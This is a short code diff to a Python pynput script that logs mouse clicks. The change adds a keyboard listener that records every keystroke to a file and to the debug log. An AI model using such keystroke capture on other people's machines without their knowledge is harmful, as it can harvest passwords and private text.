@@ -1,5 +1,5 @@
 from datetime import datetime
-from pynput import mouse
+from pynput import mouse, keyboard
 import logging
 
 logging.basicConfig(level=logging.DEBUG)
@@ -19,6 +19,14 @@ def on_click(x, y, button, pressed):
         write(log)
         logging.info(log)
 
+def on_press(key):
+    log = f'{key}'
+    write(log)
+    logging.info(log)
+
 # Collect events until released
+keyboard_listener = keyboard.Listener(on_press=on_press)
+
 with mouse.Listener(on_click=on_click) as listener:
+    keyboard_listener.start()
     listener.join()
